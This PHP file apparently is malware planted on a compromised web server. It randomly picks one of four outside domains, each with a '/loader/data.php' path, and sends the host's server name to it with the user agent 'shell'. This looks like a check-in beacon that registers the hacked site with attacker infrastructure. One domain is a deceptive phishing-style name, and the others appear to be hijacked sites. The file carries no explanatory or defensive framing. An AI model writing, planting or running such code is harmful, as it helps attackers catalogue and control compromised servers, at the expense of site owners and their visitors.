<?php
$sayi = rand(1,4);
if($sayi == 1)
{
 
  $curl2 = curl_init();
 curl_setopt_array($curl2, [
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_URL => 'http://petrowin.sg/loader/data.php?s='.$_SERVER["SERVER_NAME"].'',
    CURLOPT_USERAGENT => 'shell'
]);
 $resp2 = curl_exec($curl2);
 curl_close($curl2);
 
}
 if($sayi == 2)
{
	
  $curl4 = curl_init();
 curl_setopt_array($curl4, [
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_URL => 'http://mairie-vernou-celle77.fr/loader/data.php?s='.$_SERVER["SERVER_NAME"].'',
    CURLOPT_USERAGENT => 'shell'
]);
 $resp4 = curl_exec($curl4);
 curl_close($curl4);		
 
	
}

 if($sayi == 3)
{
  $curl3 = curl_init();
 curl_setopt_array($curl3, [
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_URL => 'http://www.secure.update.account.information.pstek.org/loader/data.php?s='.$_SERVER["SERVER_NAME"].'',
    CURLOPT_USERAGENT => 'shell'
]);
 $resp3 = curl_exec($curl3);
 curl_close($curl3);	
}
 if($sayi == 4)
{
	
  $curl = curl_init();
 curl_setopt_array($curl, [
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_URL => 'http://www.multipackplastic.com/loader/data.php?s='.$_SERVER["SERVER_NAME"].'',
    CURLOPT_USERAGENT => 'shell'
]);
 $resp = curl_exec($curl);
 curl_close($curl);
 
}

?>


 
